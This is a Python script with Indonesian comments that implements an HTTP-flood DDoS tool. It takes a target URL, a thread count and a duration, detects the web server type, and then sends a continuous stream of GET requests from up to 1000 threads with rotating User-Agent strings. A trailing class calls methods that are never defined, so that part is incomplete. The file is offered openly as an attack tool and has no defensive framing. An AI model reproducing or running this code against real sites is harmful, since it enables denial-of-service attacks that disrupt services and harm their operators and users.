import requests
import threading
import time
import random

# Fungsi untuk mendeteksi jenis web server
def detect_web_server(url):
    try:
        # Tambahkan timeout untuk mencegah hanging
        response = requests.head(url, timeout=5)
        server_header = response.headers.get("Server", "Tidak Terdeteksi")
        print(f"Jenis Web Server yang terdeteksi: {server_header}")
        return server_header
    except requests.Timeout:
        print("Timeout: Server tidak merespons dalam waktu yang ditentukan")
        return None
    except requests.ConnectionError:
        print("Koneksi gagal: Tidak dapat terhubung ke server")
        return None
    except Exception as e:
        print(f"Error tidak terduga: {str(e)}")
        return None

# Fungsi untuk mengonfirmasi dari pengguna apakah akan melanjutkan serangan
def prompt_user(server_type):
    response = input(f"Web server terdeteksi sebagai {server_type}. Lanjutkan serangan DDoS? (y/n): ")
    return response.lower() == 'y'

# Fungsi untuk menjalankan serangan DDoS dengan logika khusus berdasarkan jenis server dan durasi serangan
def perform_ddos_attack(url, server_type, num_threads, attack_duration):
    end_time = time.time() + attack_duration  # Hitung waktu akhir serangan

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
        "Mozilla/5.0 (Android 10; Mobile; rv:68.0)"
    ]
    
    def send_request():
        while time.time() < end_time:
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive"
                }
                response = requests.get(url, headers=headers, timeout=5)
                print(f"Status: {response.status_code}")
            except Exception as e:
                print(f"Request gagal: {str(e)}")

    # Mulai serangan DDoS dengan jumlah thread yang ditentukan pengguna
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    # Tunggu semua thread selesai
    for thread in threads:
        thread.join()

# Fungsi untuk validasi input
def validate_input():
    while True:
        try:
            url = input("Masukkan URL target: ")
            if not url.startswith(('http://', 'https://')):
                print("URL harus dimulai dengan http:// atau https://")
                continue
                
            num_threads = int(input("Masukkan jumlah thread (1-1000): "))
            if not 1 <= num_threads <= 1000:
                print("Jumlah thread harus antara 1-1000")
                continue
                
            attack_duration = int(input("Masukkan durasi waktu serangan dalam detik (1-3600): "))
            if not 1 <= attack_duration <= 3600:
                print("Durasi harus antara 1-3600 detik")
                continue
                
            return url, num_threads, attack_duration
        except ValueError:
            print("Input tidak valid. Mohon masukkan angka untuk thread dan durasi.")

# Prompt untuk input URL, jumlah thread, dan durasi waktu dari pengguna
url, num_threads, attack_duration = validate_input()

# Jalankan deteksi server dan mulai proses serangan
server_type = detect_web_server(url)
if server_type:
    if prompt_user(server_type):
        print(f"Memulai serangan DDoS ke server jenis {server_type} pada {url} dengan {num_threads} thread selama {attack_duration} detik...")
        perform_ddos_attack(url, server_type, num_threads, attack_duration)
    else:
        print("Serangan dibatalkan oleh pengguna.")
else:
    print("Gagal mendeteksi jenis web server. Tidak dapat melanjutkan serangan.")

class DDoSAttack:
    def __init__(self, url, threads, duration):
        self.url = url
        self.threads = threads
        self.duration = duration
        self.session = requests.Session()
        self.start_time = None
        self.end_time = None
        
    def setup(self):
        self.server_type = self.detect_web_server()
        if not self.server_type:
            return False
        return True
        
    def run(self):
        if not self.setup():
            return
        
        self.start_time = time.time()
        self.end_time = self.start_time + self.duration
        
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._attack_worker)
            threads.append(t)
            t.start()
            
        for t in threads:
            t.join()
            
    def _attack_worker(self):
        while time.time() < self.end_time:
            try:
                self._send_request()
            except Exception as e:
                self._handle_error(e)
